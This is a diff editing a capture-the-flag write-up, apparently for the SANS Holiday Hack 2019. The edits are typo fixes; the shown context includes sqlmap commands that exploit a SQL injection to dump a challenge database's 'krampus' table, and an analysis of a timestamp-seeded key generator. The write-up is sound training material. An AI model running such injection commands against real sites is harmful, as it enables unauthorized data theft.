@@ -2921,8 +2921,8 @@ This will give us an SQL error:
 Error: SELECT status FROM applications WHERE elfmail = 'testelf@gmail.com'';<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''testelf@gmail.com''' at line 1
 ```
 
-Excellent. We can now let sqlmap work it's magic on this endpoint through burp.
-Note the `--proxy` flag to allow burp to work its magic.
+Excellent. We can now let sqlmap work its magic on this endpoint through burp.
+Note the `--proxy` flag to allow burp to handle the csrf token.
 
 ```
 root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail
@@ -3005,8 +3005,10 @@ back-end DBMS: MySQL >= 5.0
 
 [*] ending @ 12:28:23 /2019-12-20/
 ```
-Excellent, now sqlmap has al the info it needs to dump the database. So lets do exactly that. Instead of a full dump however, we will be a little bit more specific to save some time!
-We list all the databases in the table, we find the `elfu` database and list all its tables. We spot the `krampus` table. Which is what we will dump.
+Excellent, now sqlmap has all the info it needs to dump the database. So lets do exactly that. Instead of a full dump however, we will be a little more specific to save some time!
+
+
+We list all the databases on the server, we find the `elfu` database and list all its tables. We spot the `krampus` table. Which is what we will dump.
 
 ```
 root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail --dbs
@@ -3134,20 +3136,20 @@ Holly Evergreen
 > _That_ guy knows how to rip a thing apart.  It's like he *breathes* opcodes!
 
 
-Elfscrow Crypto:
+Elfscrow Crypto:  
 https://downloads.elfu.org/elfscrow.exe
 
 
-Symbols:
+Symbols:  
 https://downloads.elfu.org/elfscrow.pdb
 
 
-Encrypted Document:
+Encrypted Document:  
 https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc
 
 
 #### Solution
-The executable is a windows file. So we will play with it on a commando vm.
+The executable is a windows binary. So we will play with it on a commando vm.
 We will capture the network traffic while encrypting the file.
 
 ```
@@ -3191,7 +3193,7 @@ File successfully encrypted!
 We see that we send the key `2d98906f2cda51da` to the endpoint elfscrow.elfu.org/api/store.
 The server responds to this by sending back the identifier `f42b5971-c51e-45a9-a3ac-7c532cf1e722`
 
-Resending the same key to the endpoint three times results in different three different ids:
+Resending the same key to the endpoint three times results in three different ids:
 ```
 e40f6b67-273b-4cd6-afa6-8594cdc58b63
 a5bae332-43d9-42fa-91ac-0ff6700ee6d7
@@ -3285,6 +3287,7 @@ int super_secure_random(void)
   global_value = global_value * 0x343fd + 0x269ec3;
   return global_value >> 0x10 & 0x7fff;
 }
+```
 
 We can see here that the seed is indeed just the current timestamp.
 This seed is then used in the random number generator. If we know the exact timestamp of the encryption we could generate the key that was used to encrypt.
